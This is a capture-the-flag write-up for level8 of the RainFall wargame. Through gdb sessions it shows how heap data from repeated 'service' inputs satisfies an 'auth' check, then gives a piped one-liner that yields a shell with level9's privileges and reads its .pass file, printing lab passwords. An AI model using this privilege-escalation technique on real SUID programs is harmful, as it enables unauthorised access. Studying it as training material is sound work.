Login as `level8`.
```shell
┌──$ [~/42/2022/rainfall]
└─>  ssh 192.168.0.28 -p 4242 -l level8
level7@192.168.0.19's password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level8/level8
```
A `SUID` executable is located in the home directory.
```shell
level8@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level9 users 6057 Mar  6  2016 level8
```

```gdb
level8@RainFall:~$ gdb -q ./level8
Reading symbols from /home/user/level8/level8...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) set pagination off
(gdb) run
Starting program: /home/user/level8/level8
(nil), (nil)
login

Program received signal SIGSEGV, Segmentation fault.
0x080486e7 in main ()
```
Examine what happened at failed instruction. It moves value has offset `0x8049aac+0x20` into `eax` register.
```gdb
(gdb) disassemble $eip
[...]
   0x080486e2 <+382>:	mov    eax,ds:0x8049aac
=> 0x080486e7 <+387>:	mov    eax,DWORD PTR [eax+0x20]
   0x080486ea <+390>:	test   eax,eax
[...]
(gdb) x/d 0x8049aac
0x8049aac <auth>:	0
(gdb) x *0x8049aac+0x20
0x20:	Cannot access memory at address 0x20
```
Restart program but this time starting by enter `auth whatever`
```gdb
(gdb) break *0x080486e2
Breakpoint 1 at 0x80486e2
(gdb) break *0x080486e7
Breakpoint 2 at 0x80486e7
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level8/level8
(nil), (nil)
auth root
0x804a008, (nil)
login

Breakpoint 6, 0x080486e2 in main ()
(gdb) x/i $eip
=> 0x80486e2 <main+382>:	mov    eax,ds:0x8049aac
(gdb) x/x 0x8049aac
0x8049aac <auth>:	0x0804a008
(gdb) until

Breakpoint 7, 0x080486e7 in main ()
(gdb) i r $eax
eax            0x804a008	134520840
(gdb) x/i $eip
=> 0x80486e7 <main+387>:	mov    eax,DWORD PTR [eax+0x20]
(gdb) x/x $eax+0x20
0x804a028:	0x00000000
(gdb) i r $eax
eax            0x804a008	134520840
(gdb) until
0x080486ea in main ()
(gdb) i r $eax
eax            0x0	0 # Value of auth->auth
(gdb) continue
Continuing.
Password:
```
Login condition fail and it _asks_ to enter password because `0x8049aac+0x20` still 0.
Using `service` keyword several times, 
```gdb
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level8/level8
(nil), (nil)
auth root
0x804a008, (nil)
login

Breakpoint 1, 0x080486e2 in main ()
(gdb) x/16wx 0x0804a008
0x804a008:	0x746f6f72	0x0000000a	0x00000000	0x00020ff1
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) continue
Continuing.

Breakpoint 2, 0x080486e7 in main ()
(gdb) continue
Continuing.
Password:
0x804a008, (nil)
service root
0x804a008, 0x804a018
login

Breakpoint 1, 0x080486e2 in main ()
(gdb) x/16wx 0x0804a008
0x804a008:	0x746f6f72	0x0000000a	0x00000000	0x00000011
0x804a018:	0x6f6f7220	0x00000a74	0x00000000	0x00020fe1
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) continue
Continuing.

Breakpoint 2, 0x080486e7 in main ()
(gdb) continue
Continuing.
Password:
0x804a008, 0x804a018
service root
0x804a008, 0x804a028
login

Breakpoint 1, 0x080486e2 in main ()
(gdb) x/16wx 0x0804a008
0x804a008:	0x746f6f72	0x0000000a	0x00000000	0x00000011
0x804a018:	0x6f6f7220	0x00000a74	0x00000000	0x00000011
0x804a028:	0x6f6f7220	0x00000a74	0x00000000	0x00020fd1
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) x/x 0x0804a008+0x20
0x804a028:	0x6f6f7220
(gdb) continue
Continuing.

Breakpoint 2, 0x080486e7 in main ()
(gdb) continue
Continuing.
$ id
uid=2008(level8) gid=2008(level8) groups=2008(level8),100(users)
```
Or using `service` name `0x804a028-0x804a018=0x10`
```gdb
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level8/level8
(nil), (nil)
auth root
0x804a008, (nil)
service AAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018
login

Breakpoint 1, 0x080486e2 in main ()
(gdb) x/16wx 0x0804a008
0x804a008:	0x746f6f72	0x0000000a	0x00000000	0x00000021
0x804a018:	0x41414120	0x41414141	0x41414141	0x41414141
0x804a028:	0x41414141	0x00000a41	0x00000000	0x00020fd1
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) x/x 0x0804a008+0x20
0x804a028:	0x41414141
(gdb) continue
Continuing.

Breakpoint 2, 0x080486e7 in main ()
(gdb) continue
Continuing.
$ id
uid=2008(level8) gid=2008(level8) groups=2008(level8),100(users)
```
As GDB drops SUID, run same input outside GDB.


Exploit and log on to the next level.
```shell
level8@RainFall:~$ (echo -e "auth root\n"; echo "service AAAAAAAAAAAAAAAAAAAA\n"; echo -n "login"; cat -) | ./level8
(nil), (nil)
0x804a008, (nil)
0x804a008, (nil)
0x804a008, 0x804a018

id
uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users) groups=2009(level9),100(users),2008(level8)
cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8
```
As EUID is setted to `level9` it allows to read `.pass` file.

Use-After-Free (UAF) is a vulnerability related to incorrect use of dynamic memory during program operation.[¹](https://encyclopedia.kaspersky.com/glossary/use-after-free/)
